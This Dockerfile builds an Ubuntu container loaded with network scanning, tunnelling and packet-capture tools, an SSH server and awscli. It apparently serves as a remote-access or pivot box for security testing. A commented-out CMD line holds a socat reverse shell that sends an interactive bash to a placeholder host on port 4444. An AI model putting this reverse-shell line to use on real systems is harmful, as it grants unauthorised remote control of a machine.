FROM ubuntu
ENV DEBIAN_FRONTEND noninteractive
ENV DEBIAN_PRIORITY critical
RUN apt-get -qy update                  &&  \
    apt-get -qy full-upgrade            &&  \
    apt-get -qy install                     \
        curl                                \
        dnsutils                            \
        git                                 \
        iproute2                            \
        net-tools                           \
        nmap                                \
        netcat                              \
        openssh-server                      \
        python3                             \
        python3-pip                         \
        screen                              \
        socat                               \
        stunnel                             \
        tcpdump                             \
        tmux                                \
        vim                                 \
        wget                            &&  \
        rm -f /etc/ssh/ssh_host*        &&  \
        mkdir -p /root/.ssh             &&  \
        chmod 0700 /root/.ssh           &&  \
        apt-get -qy clean               &&  \
        apt-get -qy autoclean           &&  \
        apt-get -qy autoremove --purge  &&  \
        pip3 install awscli --upgrade
COPY sshd_config /etc/ssh/sshd_config
COPY profile /root/.profile
COPY socat-listener.sh /
COPY run_ssh.sh /root/run_ssh.sh
#COPY sshkey.pub /root/.ssh/authorized_keys
#CMD ["/usr/bin/socat","exec:'bash -li',pty,stderr,setsid,sigint,sane", "tcp:YOURHOST.INVALID.COM:4444"]
#CMD ["/root/run_ssh.sh"]
CMD ["/bin/bash", "-l"]
